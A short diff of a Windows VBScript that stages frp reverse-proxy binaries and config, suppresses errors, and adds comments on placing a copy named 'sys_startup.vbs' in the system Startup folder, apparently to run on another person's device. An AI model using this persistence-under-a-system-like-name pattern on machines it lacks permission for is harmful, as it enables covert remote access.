@@ -1,4 +1,5 @@
 ' support windows ; for other's device 
+' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 系统启动目录脚本无权限，手动复制并命名为 sys_startup.vbs
 On Error Resume Next
 
 Dim dir_bak,dir_run,frp,frpini,frp_run,frpini_run,startup_dir
@@ -17,8 +18,7 @@ End Function
 
 CopyFileFun (dir_run & frp_run),(dir_bak & frp),(dir_run & frp_run)
 CopyFileFun (dir_run & frpini_run),(dir_bak & frpini),(dir_run & frpini_run)
-'startup_dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" ---系统启动目录无权限操作，手动复制操作
-'CopyFileFun (startup_dir & "sys_startup.vbs"),(dir_bak & "frp_windows.vbs"),(startup_dir & "sys_startup.vbs") 
+
 Set fsObj = Nothing
 
   ' ------ 判断系统进程是否存在 -------------------------------
